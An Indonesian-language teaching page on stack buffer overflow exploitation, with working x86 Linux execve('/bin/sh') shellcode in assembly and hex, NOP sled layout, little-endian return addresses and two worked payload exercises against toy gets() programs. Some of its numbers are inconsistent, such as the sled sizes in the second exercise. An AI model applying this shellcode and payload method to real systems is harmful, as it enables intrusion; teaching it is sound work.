Binary Exploitation — Shellcode

Menyuntikkan dan menjalankan kode mesin di memori korban

Shellcode adalah sekuens byte yang, kalau dieksekusi CPU, menjalankan perintah yang kita inginkan — biasanya membuka shell. Serangan shellcode menggabungkan buffer overflow (untuk injeksi) dengan kendali EIP/RIP (untuk eksekusi).

Fondasi — Apa itu shellcode?

Shellcode = instruksi mesin yang ditulis sebagai raw bytes

CPU tidak peduli apakah sebuah byte adalah "data" atau "kode" — ia hanya mengeksekusi apapun yang ditunjuk oleh instruction pointer (EIP/RIP). Shellcode memanfaatkan ini.

; Shellcode klasik x86 Linux: execve("/bin/sh", NULL, NULL) ; Dalam assembly: xor eax, eax ; eax = 0 push eax ; null terminator push 0x68732f2f ; "//sh" push 0x6e69622f ; "/bin" mov ebx, esp ; ebx = "/bin//sh" xor ecx, ecx ; ecx = NULL xor edx, edx ; edx = NULL mov al, 0x0b ; syscall execve = 11 int 0x80 ; kernel! ; Dalam hex bytes (yang diinjeksikan): \x31\xc0\x50\x68\x2f\x2f\x73\x68 \x68\x2f\x62\x69\x6e\x89\xe3\x31 \xc9\x31\xd2\xb0\x0b\xcd\x80

23 byte ini, kalau dieksekusi, membuka shell /bin/sh dengan hak akses program yang sedang berjalan.

Fondasi — Stack dan bagaimana overflow terjadi

Stack layout saat fungsi dipanggil

Setiap kali fungsi dipanggil, CPU menyimpan return address di stack — alamat instruksi berikutnya yang harus dieksekusi setelah fungsi selesai.

... data lain ...alamat tinggi
RETURN ADDRESS← yang ingin kita overwrite!
saved EBP
local variable 2
char buffer[64] ← kita tulis ke sinialamat rendah
Kalau kita menulis lebih dari 64 byte ke buffer, kelebihan byte akan menimpa: local variables → saved EBP → RETURN ADDRESS. Kalau return address ditimpa dengan alamat shellcode kita, CPU akan loncat dan eksekusi shellcode!
Fondasi — Tiga komponen serangan shellcode

Setiap serangan shellcode terdiri dari tiga bagian

1. Shellcode payload
Byte-byte yang akan dieksekusi. Biasanya: execve("/bin/sh"), atau baca file, atau reverse shell.
2. Padding / NOP sled
Byte-byte pengisi untuk mencapai return address. Sering diisi dengan NOP (0x90) — instruksi "tidak lakukan apa-apa, lanjut ke berikutnya".
3. Return address (overwrite)
Alamat di mana shellcode kita berada. Menimpa return address asli sehingga CPU loncat ke shellcode kita.
Struktur payload: [SHELLCODE][PADDING hingga return addr][ALAMAT SHELLCODE]
Soal 1 — Shellcode Injection Dasar

Hitung offset dan susun payload!

Diberikan program C berikut yang berjalan di x86 Linux (32-bit) tanpa proteksi (no ASLR, no NX, no canary). Susun payload untuk mengeksekusi shellcode!

#include <stdio.h> #include <string.h> void vuln() { char buf[32]; // buffer 32 byte gets(buf); // ← BERBAHAYA! tidak cek panjang printf("Input: %s\n", buf); } int main() { vuln(); return 0; }
Info tambahan yang diberikan:
- Buffer di alamat: 0xbffff4a0
- Return address ada di: 0xbffff4c4 (offset 36 dari awal buffer)
- Shellcode yang dipakai: 23 byte execve("/bin/sh")
- Shellcode bytes: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80

Pertanyaan: Susun payload lengkap (dalam hex bytes) untuk mengeksekusi shellcode!

Langkah 3 — Susun bagian 1: shellcode bytes

23 byte pertama = shellcode execve

; Shellcode 23 byte (execve /bin/sh): \x31\xc0 ; xor eax, eax \x50 ; push eax (null) \x68\x2f\x2f\x73\x68 ; push "//sh" \x68\x2f\x62\x69\x6e ; push "/bin" \x89\xe3 ; mov ebx, esp \x31\xc9 ; xor ecx, ecx \x31\xd2 ; xor edx, edx \xb0\x0b ; mov al, 11 (execve syscall) \xcd\x80 ; int 0x80 (syscall!)

Hitung manual: 2+1+5+5+2+2+2+2+2 = 23 byte ✓

Shellcode ini tidak boleh mengandung byte \x00 (null byte) karena gets() atau strcpy() akan berhenti membaca saat menemukan null byte!
Langkah 4 — Susun bagian 2: padding NOP

13 byte NOP = \x90 × 13

NOP = No Operation = instruksi CPU yang tidak melakukan apa-apa selain increment EIP ke instruksi berikutnya. Byte-nya selalu 0x90.

; 13 byte NOP padding: \x90\x90\x90\x90\x90\x90\x90 \x90\x90\x90\x90\x90\x90

Mengapa pakai NOP bukan byte random? Karena NOP aman — kalau CPU tidak sengaja mulai eksekusi dari tengah NOP sled, ia akan slide terus sampai ke shellcode. Ini membuat serangan lebih reliabel.

[byte 0–22] SHELLCODE 23 byte0xbffff4a0
[byte 23–35] NOP ×130xbffff4b7
[byte 36–39] RETURN ADDRESS baru0xbffff4c4
Langkah 5 — Susun bagian 3: return address (little-endian!)

Return address = 0xbffff4a0, ditulis little-endian

x86 menggunakan format little-endian — byte terkecil (LSB) ditulis duluan. Jadi 0xbffff4a0 ditulis sebagai:

0xbffff4a0 dalam little-endian: LSB dulu → a0, f4, ff, bf \xa0\xf4\xff\xbf

SALAH (big-endian)

\xbf\xff\xf4\xa0

CPU akan baca alamat 0xbffff4a0 dari balik → loncat ke tempat salah!

BENAR (little-endian)

\xa0\xf4\xff\xbf

CPU membaca 4 byte ini dan menginterpretasikan sebagai 0xbffff4a0 ✓

Aturan little-endian: balik urutannya per byte. 0xbffff4a0 → \xa0\xf4\xff\xbf

Ringkasan menyusun payload shellcode

1. Hitung offset ke return address: alamat_ret - alamat_buffer

2. Struktur: [shellcode][NOP padding = offset - len(shellcode)][ret_addr]

3. Return address ditulis little-endian (balik byte-nya)

4. Shellcode tidak boleh mengandung null byte (\x00)

5. Total payload = offset + 4 byte (ukuran pointer)

Soal 2 — NOP Sled Attack

Alamat stack tidak pasti — gunakan NOP sled!

Sekarang kita tidak tahu persis alamat buffer (ASLR ringan — stack bergeser sedikit). Tapi kita tahu buffer ada di sekitar 0xbffff400±128. Gunakan NOP sled untuk memperbesar target!

void vuln() { char buf[128]; // buffer lebih besar gets(buf); }
Info:
- Buffer size: 128 byte
- Offset ke return address: 136 byte (128 buffer + 4 EBP + 4 alignment)
- Perkiraan alamat stack: ~0xbffff400 (±128 byte karena env vars)
- Shellcode: 23 byte (sama seperti soal 1)

Pertanyaan: Susun payload dengan NOP sled yang cukup besar untuk meningkatkan probabilitas sukses!

Langkah 1 — Mengapa alamat stack tidak pasti?

Stack bergeser karena environment variables dan arguments

Posisi stack bergantung pada: panjang environment variables, jumlah argumen program, path executable, dll. Meski ASLR dimatikan, stack bisa bergeser 16–256 byte antar eksekusi.

# Tanpa ASLR, stack tetap bisa bergeser: $ ./vuln → buf di 0xbffff400 $ env VAR=aaaa ./vuln → buf di 0xbffff3f8 (bergeser -8) $ ./vuln arg1 arg2 → buf di 0xbffff3e0 (bergeser -32)
Kalau kita tebak alamat salah 1 byte pun, shellcode tidak dieksekusi — CPU akan crash atau eksekusi instruksi acak.
Solusi: isi buffer dengan banyak NOP sebelum shellcode. Kalau CPU "jatuh" di mana saja dalam NOP sled, ia akan slide terus sampai ke shellcode.
Langkah 2 — Konsep NOP sled

NOP sled = "landasan" yang menggiring ke shellcode

RETURN ADDRESS: 0xbffff480 (tengah NOP sled)+136
saved EBP+132
SHELLCODE (23 byte)+109 s/d +131
NOP NOP NOP ... (109 byte sled)+0 s/d +108

Kalau CPU loncat ke MANA SAJA dalam zona NOP (0xbffff400 s/d 0xbffff46c), ia akan slide dan sampai ke shellcode. Target kita bukan 1 titik — tapi 109 byte!

Window sukses meningkat dari 1 alamat tepat → 109 byte area. Probabilitas sukses: ~85% kalau stack bergeser ±64 byte.

Langkah 5 — Visualisasi mengapa NOP sled berhasil

Tiga skenario: alamat tepat, terlalu awal, terlalu akhir

Skenario 1: CPU loncat ke tengah NOP sled

Skenario 2: CPU loncat ke awal NOP sled

Skenario 3: CPU loncat terlalu jauh (melewati shellcode)
→ CRASH atau instruksi acak ✗
Jawaban soal
NOP(105) + Shellcode(23) + Pad(8) + RetAddr(4) = 140 byte

Tips NOP sled di soal ujian

1. NOP sled = buffer_size - len(shellcode) byte sebelum shellcode

2. Return address tujukan ke TENGAH NOP sled untuk toleransi max

3. Makin besar buffer → makin besar NOP sled → makin reliable

4. NOP byte: \x90 (x86). Di arsitektur lain berbeda!

NOP sled tidak bekerja kalau ASLR penuh aktif — perlu bypass ASLR dulu

Analisis — Diseksi shellcode byte per byte

Mengapa setiap byte dipilih dengan hati-hati

Shellcode bukan kode biasa — ada constraint ketat yang harus dipenuhi:

Tidak boleh ada \x00

strcpy/gets berhenti di null byte → payload terpotong sebelum selesai.

Tidak boleh ada \x0a (newline)

gets() berhenti di newline — payload terpotong juga.

BytesAssemblyKenapa tidak pakai cara langsung?
\x31\xc0xor eax, eaxmov eax, 0 → menghasilkan \x00 di opcode!
\x31\xc9xor ecx, ecxSama — xor lebih pendek dan null-free
\x68\x2f\x2f\x73\x68push "//sh""/bin/sh" butuh 7 byte, harus dibagi dua push. // = /bin/sh tetap valid di Linux
\xb0\x0bmov al, 11mov eax, 11 → \xb8\x0b\x00\x00\x00 ada null! Pakai mov al saja.
\xcd\x80int 0x80Linux x86 syscall interrupt

Analisis — Checklist mengerjakan soal shellcode

Langkah sistematis untuk soal apapun

Step 1: Hitung offset ke return address
offset = alamat_ret_addr - alamat_buffer (atau dari GDB: info frame)
Step 2: Cek ada atau tidaknya bad bytes
Fungsi apa yang membaca input? gets=no \x0a, strcpy=no \x00, dll
Step 3: Tentukan ukuran NOP sled
NOP = offset - len(shellcode). Kalau offset terlalu kecil, tidak bisa pakai NOP sled.
Step 4: Tentukan return address
Jika alamat tepat diketahui: pakai itu. Jika tidak: incar tengah NOP sled.
Step 5: Encode return address ke little-endian
0xdeadbeef → \xef\xbe\xad\xde (balik per byte)
Step 6: Susun payload final
[NOP sled][shellcode][padding ke ret addr][ret addr little-endian]
